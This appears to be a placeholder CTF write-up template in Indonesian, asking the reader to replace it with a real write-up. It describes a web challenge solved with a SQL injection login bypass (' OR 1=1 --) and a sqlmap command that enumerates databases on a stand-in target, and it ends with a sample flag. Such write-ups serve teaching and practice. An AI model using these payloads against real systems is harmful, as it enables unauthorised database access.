---
title: "Contoh CTF Writeup – Web Challenge"
description: "Writeup untuk challenge web CTF yang melibatkan SQL injection dan XSS bypass."
publishDate: 2026-08-20
tags: ["CTF", "web", "sql-injection", "xss"]
---

> Ganti konten ini dengan writeup CTF kamu yang sebenarnya.

## Overview

Challenge ini merupakan bagian dari **Sample CTF 2026**, kategori Web Exploitation.

- **Poin:** 500
- **Solve:** 12 teams

## Analysis

Setelah membuka website target, kita menemukan form login sederhana. Dengan memasukkan payload `' OR 1=1 --`, kita bisa bypass autentikasi.

```sql
SELECT * FROM users WHERE username = '' OR 1=1 -- ' AND password = '...'
```

## Exploitation

Selanjutnya, kita menggunakan `sqlmap` untuk dump database:

```bash
sqlmap -u "http://target.ctf/login" --data="username=admin&password=test" --dbs
```

Output:
```
[*] available databases:
[1] ctf_db
[2] information_schema
```

## Flag

```
FLAG{s4mpl3_fl4g_g4nti_dengan_flag_aslimu}
```
